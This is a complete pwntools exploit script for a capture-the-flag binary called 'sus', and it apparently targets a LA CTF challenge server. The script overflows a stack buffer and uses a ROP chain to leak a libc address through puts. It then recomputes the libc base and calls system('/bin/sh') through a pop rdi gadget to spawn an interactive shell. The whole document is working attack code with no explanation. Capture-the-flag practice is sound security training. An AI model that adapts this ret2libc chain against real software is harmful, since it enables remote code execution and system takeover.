from pwn import *
from icecream import ic

exe = ELF("./sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

elf = context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31284)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401190
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

sus = 0x0000000000401146
ret = 0x0000000000401016
payload = b'a'*(8*7)
payload += p64(elf.got['puts'])
payload += b'a'*8
payload += p64(ret)
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

sl(payload)
ru("sus?\n")
leak = u64(re(6)+b'\x00\x00')
libc.address = leak-0x77980
ic(hex(leak))
pop_rdi = libc.address+0x00000000000277e5
binsh = libc.address+0x196031
payload = b'a'*(8*9)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])

sl(payload)
i()
